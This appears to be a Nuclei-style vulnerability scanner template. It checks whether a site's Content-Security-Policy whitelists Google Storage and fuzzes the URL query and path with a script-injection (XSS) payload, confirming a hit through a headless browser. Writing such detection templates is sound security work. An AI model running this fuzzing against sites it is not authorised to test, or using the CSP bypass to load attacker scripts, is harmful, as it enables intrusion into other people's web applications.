flow: http(1) && headless(1)
headless:
- fuzzing:
  - fuzz:
    - '{{url_encode(injection)}}'
    mode: single
    part: query
    type: replace
  - fuzz:
    - '{{url_encode(injection)}}'
    mode: single
    part: path
    type: replace
  matchers:
  - dsl:
    - google_storage_csp_xss == true
    type: dsl
  payloads:
    injection:
    - <script>alert(document.domain)</script>
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}'
  - action: waitdialog
    args:
      max-duration: 5s
    name: google_storage_csp_xss
http:
- matchers:
  - condition: and
    internal: true
    part: header
    type: word
    words:
    - Content-Security-Policy
    - storage.googleapis.com
  method: GET
  path:
  - '{{BaseURL}}'
id: google-storage-csp-bypass
info:
  author: 0x_Akoko
  classification:
    cwe-id: CWE-79
  description: 'CSP policy allows Google Storage (storage.googleapis.com) enabling
    malicious JavaScript execution by loading attacker-controlled files from whitelisted
    domain.

    '
  metadata:
    max-request: 2
    verified: true
  name: Content-Security-Policy Bypass - Google Storage
  reference:
  - https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy
  - https://huntr.com/bounties/6cea89d1-39dc-4023-82fa-821f566b841a
  severity: medium
  tags: xss,csp-bypass,google-storage,vuln
